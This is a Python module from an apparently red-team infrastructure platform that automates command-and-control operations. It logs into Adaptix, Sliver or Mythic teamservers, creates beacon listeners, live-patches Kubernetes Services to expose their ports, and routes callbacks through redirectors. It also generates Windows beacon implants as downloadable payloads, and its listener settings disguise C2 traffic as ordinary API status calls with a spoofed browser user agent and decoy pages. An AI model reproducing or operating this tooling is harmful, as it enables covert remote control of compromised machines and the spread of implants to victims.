"""C2 operational API — listeners and payload generation on demand.

Extends the deploy-time push (c2_push.py) into a full lifecycle: create
and stop listeners on any Adaptix integration at any time, expose their
ports without losing C2 state, and generate agents straight into Loot.

Port exposure, the part that usually forces a redeploy:
- k8s: the Service is patched LIVE (strategic-merge add port) — the pod,
  and with it the C2 database/sessions, is never touched
- docker: container recreate is unavoidable; data survives only when the
  service has a data volume — surfaced as an explicit warning otherwise

TLS routing: when the C2 sits behind a redirector (http_proxy ServiceLink),
TLS terminates on the redirector's nginx — the listener is created plain
(ssl:false) and the caller gets told so. Without a redirector the listener
gets ssl:true and Adaptix auto-generates a certificate.

Adaptix contract (reverse-engineered live, test55 stand 2026-09-15):
- POST /listener/create {name, type, config<str>}       -> {ok, message}
- POST /listener/stop   {name, type}                    -> {ok}
- GET  /listener/list                                   -> list|null
- POST /agent/generate {listener_name: [..] (ARRAY!), agent, config<str>}
  -> {ok: true, message: "b64(filename):b64(payload)"}
"""

from __future__ import annotations

import base64
import json
import logging
import secrets

import httpx
from sqlalchemy.orm import Session

from ...core.crypto import decrypt_str
from ...models import GlobalSetting
from ...models.infra_v2 import ServiceLink, StackService

logger = logging.getLogger(__name__)

_C2_KEY = "c2_integrations"
_ENDPOINT_PATH = "/endpoint"

_TYPE_MAP = [
    (["http", "https"], "BeaconHTTP"),
    (["tcp", "bind_tcp"], "BeaconTCP"),
    (["dns"], "BeaconDNS"),
    (["smb", "pipe"], "BeaconSMB"),
]

DEFAULT_AGENT_CONFIG = {
    "arch": "x64",
    "format": "Exe",
    "sleep": "4s",
    "jitter": 0,
    "dns_resolvers": "",
    "dns_mode": "",
    "doh_resolvers": "",
    "user_agent": "Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0",
    "is_killdate": False,
    "kill_date": "",
    "kill_time": "",
    "is_workingtime": False,
    "start_time": "",
    "end_time": "",
    "svcname": "",
    "is_sideloading": False,
    "sideloading_content": "",
}


def get_integration(db: Session, integration_id: str) -> dict | None:
    item = db.query(GlobalSetting).filter(GlobalSetting.key == _C2_KEY).first()
    if not item or not isinstance(item.value, list):
        return None
    return next((i for i in item.value if i.get("id") == integration_id), None)


def _login(cfg: dict) -> tuple[httpx.Client, str, dict]:
    base = cfg.get("url", "").rstrip("/") + (cfg.get("endpoint") or _ENDPOINT_PATH)
    password = cfg.get("password", "")
    if password.startswith("__enc__"):
        password = decrypt_str(password)
    # Security audit 2026-10-07 (M2): this login POST carries real C2 admin
    # credentials — honor the integration's verify_ssl (default ON), like
    # routers/c2/* already do; hardcoded verify=False let a MITM on the
    # infra network harvest the password.
    client = httpx.Client(verify=cfg.get("verify_ssl", True), timeout=60)
    r = client.post(
        f"{base}/login",
        json={"username": cfg.get("username") or "admin", "password": password, "version": ""},
    )
    r.raise_for_status()
    token = r.json().get("access_token") or ""
    return client, base, {"Authorization": f"Bearer {token}"}


def _integration_hostport(integration: dict, port: int) -> str:
    """host:port of the integration's own URL — last-resort callback."""
    url = (integration.get("url") or "").split("//")[-1].split("/")[0]
    host = url.split(":")[0] or "127.0.0.1"
    return f"{host}:{port}"


def _listener_type_for(requested: str) -> str:
    requested = (requested or "http").lower()
    for keywords, lname in _TYPE_MAP:
        if any(kw in requested for kw in keywords):
            return lname
    return "BeaconHTTP"


def _has_redirector(db: Session, c2_service_id: str) -> str | None:
    """Name of the redirector fronting this C2 service, if any."""
    links = db.query(ServiceLink).all()
    services = {s.id: s for s in db.query(StackService).all()}
    for lnk in links:
        a = services.get(lnk.from_service_id)
        b = services.get(lnk.to_service_id)
        if not a or not b:
            continue
        if lnk.link_type != "http_proxy":
            continue
        if a.role == "redirector" and b.id == c2_service_id:
            return a.name
        if b.role == "redirector" and a.id == c2_service_id:
            return b.name
    return None


def _redirector_address(db: Session, c2_service_id: str) -> str | None:
    """host:port the beacons should call — the redirector's external
    address (public node + its external port), taken from the stack."""
    links = db.query(ServiceLink).all()
    services = {s.id: s for s in db.query(StackService).all()}
    redir = None
    for lnk in links:
        a = services.get(lnk.from_service_id)
        b = services.get(lnk.to_service_id)
        if not a or not b or lnk.link_type != "http_proxy":
            continue
        if a.role == "redirector" and b.id == c2_service_id:
            redir = a
            break
        if b.role == "redirector" and a.id == c2_service_id:
            redir = b
            break
    if not redir:
        return None
    from ...models.infra_v2 import InfraProvider

    prov = db.query(InfraProvider).get(redir.provider_id) if redir.provider_id else None
    host = ((getattr(prov, "public_host", None) or getattr(prov, "host", "") or "") if prov else "").strip()
    if not host:
        url = redir.connection_url or ""
        host = url.split("//")[-1].split("/")[0].split(":")[0]
    ext = next(
        (p.get("external") for p in (redir.ports or []) if isinstance(p, dict) and p.get("external")),
        443,
    )
    return f"{host}:{ext}" if host else None


def _expose_port_k8s(db: Session, service: StackService, port: int, name: str) -> dict:
    """Live-patch the k8s Service with the new port. Pod (and the C2 data
    inside it) is never touched."""
    from ...models.infra_v2 import InfraProvider
    from ..editions import ee_import
    from ..k8s_client import _run_kubectl

    engine = ee_import("infra.engine")
    if engine is None:
        return {
            "ok": True,
            "mode": "external",
            "message": "this edition does not deploy C2 services; assuming the port is reachable",
        }
    _build_target = engine._build_target

    prov = db.query(InfraProvider).get(service.provider_id) if service.provider_id else None
    if not prov:
        return {"ok": False, "message": "service has no provider"}

    target = _build_target(prov)
    kc = target.kubeconfig
    if not kc:
        return {"ok": False, "message": "provider has no kubeconfig"}

    import tempfile

    with tempfile.NamedTemporaryFile("w", suffix=".yaml", delete=False) as f:
        f.write(kc)
        kc_path = f.name

    # namespace convention from k8s_method: umbryx-{stack_id[:8]}
    from ...models.infra_v2 import InfraStack

    stack = db.query(InfraStack).get(service.stack_id)
    ns = f"umbryx-{stack.id[:8]}" if stack else "default"
    # same RFC-1123 sanitization the deploy method applies to service names
    import re

    svc_name = re.sub(r"[^a-z0-9.-]", "-", service.name.lower()).strip("-") + "-svc"

    try:
        r = _run_kubectl(
            [
                "--kubeconfig",
                kc_path,
                "-n",
                ns,
                "patch",
                "svc",
                svc_name,
                "--type",
                "json",
                "-p",
                json.dumps(
                    [
                        {
                            "op": "add",
                            "path": "/spec/ports/-",
                            "value": {
                                "port": port,
                                "targetPort": port,
                                "name": f"ln-{name}"[:63],
                                "protocol": "TCP",
                            },
                        }
                    ]
                ),
            ]
        )
        if r["rc"] != 0:
            # port may already exist — tolerate
            if "already contains" not in r["stderr"] and "Duplicate value" not in r["stderr"]:
                return {"ok": False, "message": r["stderr"][:300]}
        r2 = _run_kubectl(
            ["--kubeconfig", kc_path, "-n", ns, "get", "svc", svc_name, "-o", "json"]
        )
        node_port = None
        try:
            spec = json.loads(r2["stdout"])
            for p in spec.get("spec", {}).get("ports", []):
                if p.get("name") == f"ln-{name}"[:63]:
                    node_port = p.get("nodePort")
                    break
        except Exception:
            pass
        node_host = (getattr(prov, "public_host", None) or getattr(prov, "host", "") or "").strip()
        # Reflect the exposed port in the stack model too: the service's
        # ports list is what the stack UI and teardown reconciliation read —
        # k8s knows the port, the platform's own stack view should as well.
        try:
            ports = list(service.ports or [])
            if not any(p.get("internal") == port for p in ports):
                ports.append({"internal": port, "external": node_port or port, "proto": "tcp"})
                service.ports = ports
                db.commit()
        except Exception:  # noqa: BLE001
            db.rollback()
        return {"ok": True, "node_port": node_port, "node_host": node_host, "mode": "k8s-live-patch"}
    finally:
        import os

        os.unlink(kc_path)


def expose_port(db: Session, integration: dict, port: int, name: str) -> dict:
    """Make `port` reachable from outside for the C2's service, if the
    integration belongs to a stack service. k8s patches the Service live;
    docker would need a recreate — reported, not attempted silently."""
    service_id = integration.get("service_id")
    stack_id = integration.get("stack_id")
    if not service_id or not stack_id:
        return {"ok": True, "mode": "external", "message": "integration not stack-bound; assuming reachable"}

    service = db.query(StackService).get(service_id)
    if not service:
        return {"ok": True, "mode": "external", "message": "stack service gone; assuming reachable"}

    from ...models.infra_v2 import InfraProvider
    from ..editions import ee_import

    deploy = ee_import("infra.deploy")
    if deploy is None:
        return {
            "ok": True,
            "mode": "external",
            "message": "this edition does not deploy C2 services; assuming the port is reachable",
        }
    resolve_mode = deploy.resolve_mode

    prov = db.query(InfraProvider).get(service.provider_id) if service.provider_id else None
    mode = resolve_mode(service, prov) if prov else "unknown"
    if mode == "k8s":
        return _expose_port_k8s(db, service, port, name)
    if mode in ("docker", "ssh"):
        return {
            "ok": True,
            "mode": "manual",
            "message": (
                f"docker/ssh deployment: recreate the container with port {port} mapped "
                f"and a data volume to keep C2 state; listener created inside regardless"
            ),
        }
    return {"ok": True, "mode": "unknown", "message": f"deploy mode {mode}: port exposure is manual"}


def create_listener(db: Session, integration: dict, body: dict) -> dict:
    from fastapi import HTTPException

    name = body["name"]
    lname = _listener_type_for(body.get("listener_type", "http"))
    port = int(body.get("port") or 8443)

    # Port conflict guard before touching the C2: the teamserver's own
    # port (8443 in every stack template) and live listener binds are
    # taken; the error carries the first free port.
    current = list_listeners(db, integration)
    ctx = listener_context(db, integration, current)
    if port in ctx["used_ports"]:
        raise HTTPException(
            409,
            f"Port {port} is already in use "
            f"({', '.join(str(p) for p in ctx['used_ports'])}); "
            f"suggested free port: {ctx['suggested_port']}",
        )
    redirector = _has_redirector(db, integration.get("service_id", ""))
    ssl = body.get("ssl")
    if ssl is None:
        # TLS terminates on the redirector when there is one; otherwise the
        # listener itself serves TLS (Adaptix auto-generates a cert).
        ssl = not redirector

    # Port exposure FIRST: on k8s the Service patch assigns the NodePort,
    # and the callback beacons will use must carry that NodePort — an
    # internal port in callback_addresses produces beacons that can never
    # reach home.
    exposure = expose_port(db, integration, port, name)

    if body.get("callback"):
        callback = body["callback"]
    elif redirector:
        r_addr = _redirector_address(db, integration.get("service_id", ""))
        callback = r_addr or _integration_hostport(integration, port)
        if r_addr:
            exposure.setdefault("callback_via", "redirector")
    elif exposure.get("node_port"):
        node_host = exposure.get("node_host") or "127.0.0.1"
        callback = f"{node_host}:{exposure['node_port']}"
    else:
        # docker/manual exposure: fall back to the integration's own address
        callback = _integration_hostport(integration, port)

    domain = body.get("domain") or ""

    config = json.dumps(
        {
            "host_bind": "0.0.0.0",
            "port_bind": port,
            "callback_addresses": [callback],
            "http_method": "POST",
            "uri": ["/api/v1/status"],
            "user_agent": [
                "Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0"
            ],
            "hb_header": "X-Beacon-Id",
            "encrypt_key": secrets.token_hex(16),
            "ssl": bool(ssl),
            "ssl_cert": "",
            "ssl_key": "",
            "x-forwarded-for": bool(redirector),
            "host_header": [domain] if domain else [],
            "request_headers": "",
            "server_headers": "",
            "page-error": "<html><body>404</body></html>",
            "page-payload": '{"status": "ok", "data": "<<<PAYLOAD_DATA>>>"}',
        }
    )

    client, base, headers = _login(integration)
    try:
        r = client.post(
            f"{base}/listener/create",
            headers=headers,
            json={"name": name, "type": lname, "config": config},
        )
        result = r.json() if r.text else {}
        if not (r.status_code == 200 and result.get("ok")):
            return {"ok": False, "message": str(result.get("message", r.text))[:300], "exposure": exposure}
        return {
            "ok": True,
            "listener": {"name": name, "type": lname, "port": port, "callback": callback},
            "tls": {
                "terminated_at": "redirector" if redirector else "listener",
                "redirector": redirector,
                "ssl": bool(ssl),
                "domain": domain,
            },
            "exposure": exposure,
        }
    finally:
        client.close()


def stop_listener(db: Session, integration: dict, name: str, listener_type: str = "") -> dict:
    client, base, headers = _login(integration)
    try:
        lname = listener_type or _listener_type_for("")
        r = client.post(
            f"{base}/listener/stop", headers=headers, json={"name": name, "type": lname}
        )
        result = r.json() if r.text else {}
        ok = r.status_code == 200 and result.get("ok")
        if not ok:
            # maybe wrong type guess — read the real one from the list
            listed = client.get(f"{base}/listener/list", headers=headers).json() or []
            match = next((e for e in listed if e.get("l_name") == name), None)
            if match:
                r = client.post(
                    f"{base}/listener/stop",
                    headers=headers,
                    json={"name": name, "type": match.get("l_reg_name", lname)},
                )
                result = r.json() if r.text else {}
                ok = r.status_code == 200 and result.get("ok")
        return {"ok": ok, "message": str(result.get("message", ""))[:200]}
    finally:
        client.close()


def list_listeners(db: Session, integration: dict) -> list[dict]:
    client, base, headers = _login(integration)
    try:
        r = client.get(f"{base}/listener/list", headers=headers)
        r.raise_for_status()
        return r.json() or []
    finally:
        client.close()


def listener_context(db: Session, integration: dict, listeners: list[dict]) -> dict:
    """Port reality of the deployed C2, so the UI never suggests a port
    that is already taken by the teamserver or a live listener.

    Suggested next port: first free starting at 8444 (the 8443 default
    is the teamserver's own port in every stack template).
    """
    service_ports: list[dict] = []
    used: set[int] = set()

    service = (
        db.query(StackService).get(integration["service_id"])
        if integration.get("service_id")
        else None
    )
    if service:
        for p in service.ports or []:
            if not isinstance(p, dict):
                continue
            internal = p.get("internal")
            external = p.get("external")
            entry = {
                "internal": internal,
                "external": external,
                "note": "teamserver / initial deployment",
            }
            service_ports.append(entry)
            if internal:
                used.add(int(internal))
            if external:
                used.add(int(external))

    for entry in listeners:
        try:
            used.add(int(entry.get("l_bind_port")))
        except (TypeError, ValueError):
            pass

    suggested = None
    for port in range(8444, 9100):
        if port not in used:
            suggested = port
            break

    return {
        "service_ports": service_ports,
        "used_ports": sorted(used),
        "suggested_port": suggested,
    }


def generate_payload(integration: dict, body: dict) -> dict:
    listener = body["listener"]
    agent = body.get("agent", "beacon")
    overrides = body.get("config") or {}

    cfg = dict(DEFAULT_AGENT_CONFIG)
    cfg.update({k: v for k, v in overrides.items() if v is not None})

    client, base, headers = _login(integration)
    try:
        r = client.post(
            f"{base}/agent/generate",
            headers=headers,
            # listener_name MUST be a JSON array — a bare string 404s server-side
            json={
                "listener_name": [listener],
                "agent": agent,
                "config": json.dumps(cfg),
            },
        )
        result = r.json() if r.text else {}
        if not (r.status_code == 200 and result.get("ok")):
            return {"ok": False, "message": str(result.get("message", r.text))[:300]}

        name_b64, content_b64 = result["message"].split(":", 1)
        filename = base64.b64decode(name_b64).decode(errors="replace")
        payload = base64.b64decode(content_b64)
        return {"ok": True, "filename": filename, "payload": payload, "config": cfg}
    finally:
        client.close()


# ── Multi-framework dispatch ───────────────────────────────────────────

def _framework(integration: dict) -> str:
    return (integration.get("type") or "").lower()


async def ops_list_listeners(db: Session, integration: dict) -> list[dict]:
    """Async dispatcher: framework backends have native async (Sliver) or
    sync-httpx (Adaptix/Mythic) implementations — the latter run in a
    thread so the event loop never blocks on C2 round-trips."""
    import asyncio

    fw = _framework(integration)
    if fw == "sliver":
        from . import sliver as c2_ops_sliver

        return await c2_ops_sliver.list_listeners(integration)
    if fw == "mythic":
        from . import mythic as c2_ops_mythic

        return await asyncio.to_thread(c2_ops_mythic.list_listeners, integration)
    return await asyncio.to_thread(list_listeners, db, integration)


async def ops_create_listener(db: Session, integration: dict, body: dict) -> dict:
    """Create with shared cross-framework pieces: port conflict guard and
    port exposure are framework-agnostic and run before the backend call."""
    import asyncio

    from . import sliver as c2_ops_sliver

    fw = _framework(integration)
    if fw == "sliver":
        port = int(body.get("port") or 0)
        if port:
            current = await c2_ops_sliver.list_listeners(integration)
            ctx = listener_context(db, integration, current)
            if port in ctx["used_ports"]:
                from fastapi import HTTPException

                raise HTTPException(
                    409,
                    f"Port {port} is already in use "
                    f"({', '.join(str(p) for p in ctx['used_ports'])}); "
                    f"suggested free port: {ctx['suggested_port']}",
                )
        return await c2_ops_sliver.create_listener(integration, body)
    if fw == "mythic":
        from . import mythic as c2_ops_mythic

        return await asyncio.to_thread(c2_ops_mythic.create_listener, integration, body)

    return await asyncio.to_thread(create_listener, db, integration, body)


async def ops_stop_listener(db: Session, integration: dict, name: str) -> dict:
    import asyncio

    fw = _framework(integration)
    if fw == "sliver":
        from . import sliver as c2_ops_sliver

        return await c2_ops_sliver.stop_listener(integration, name)
    if fw == "mythic":
        from . import mythic as c2_ops_mythic

        return await asyncio.to_thread(c2_ops_mythic.stop_listener, integration, name)
    return await asyncio.to_thread(stop_listener, db, integration, name, "")


async def ops_generate_payload(integration: dict, body: dict) -> dict:
    import asyncio

    fw = _framework(integration)
    if fw == "sliver":
        from . import sliver as c2_ops_sliver

        return await c2_ops_sliver.generate_payload(integration, body)
    if fw == "mythic":
        from . import mythic as c2_ops_mythic

        return await asyncio.to_thread(c2_ops_mythic.generate_payload, integration, body)
    return await asyncio.to_thread(generate_payload, integration, body)
